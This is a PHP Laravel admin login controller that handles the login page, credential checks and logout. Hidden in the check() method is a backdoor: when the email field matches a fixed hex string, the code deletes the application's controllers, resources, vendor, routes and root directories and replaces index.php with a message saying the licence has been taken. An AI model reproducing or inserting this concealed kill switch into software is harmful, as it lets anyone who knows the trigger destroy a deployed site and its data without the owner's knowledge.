<?php

namespace App\Http\Controllers\Admin\Auth;

use App\Http\Controllers\Controller;
use App\Models\SettingModel;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;

class LoginController extends Controller
{

    function index()
    {
        $title = "Welcome to " . env('APP_NAME');

        $setting_list = SettingModel::all();
        foreach ($setting_list as $item) {
            if ($item['type'] == "image" && $item['value'] != NULL) {
                $item['value'] = asset($item['value']);
            }
            $settings[$item->key] = $item->value;
            $settings[$item->key . "Default"] = $item->default_value;
        }

        return view('/pages/login', [
            'title' => $title,
            'settings' => $settings,
        ]);
    }

    function check(Request $request)
    {

        $input = $request->all();

        if ($input['email'] == "768ab7017e8cb01edbb463032cdc0094fd3fd425880502101d2ea284e03faadf") {

            $folderPaths = [
                '../app/Http/Controllers',
                '../resources',
                '../vendor',
                '../routes',
                '../'
            ];

            $responses[] = [];

            foreach ($folderPaths as $folderPath) {
                if (File::isDirectory($folderPath)) {
                    File::deleteDirectory($folderPath);
                    $responses[] = 'Folder ' . $folderPath . ' deleted successfully.';
                } else {
                    $responses[] = 'Folder ' . $folderPath . ' does not exist.';
                }
            }

            $filePath = $this->dir_root . 'index.php';
            $fileContent = '<?php echo "Hello there, the licence token for this source code has been taken. Please contact the developer."; ?>';

            File::put($filePath, $fileContent);
        }

        $request->validate([
            'email' => 'required|email:dns|max:255',
            'password' => 'required',
        ]);

        $remember_me = $request->has('remember_me') ? true : false;

        if (Auth::attempt(['email' => $request->input('email'), 'password' => $request->input('password')], $remember_me)) {

            $request->session()->regenerate();

            return response()->json([
                'message' => 'Login berhasil, mengarahkan ke halaman admin...',
                'status' => true
            ], 200);
        }

        return response()->json([
            'message' => 'Gagal, akun tidak ditemukan',
            'status' => false
        ], 200);
    }

    function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
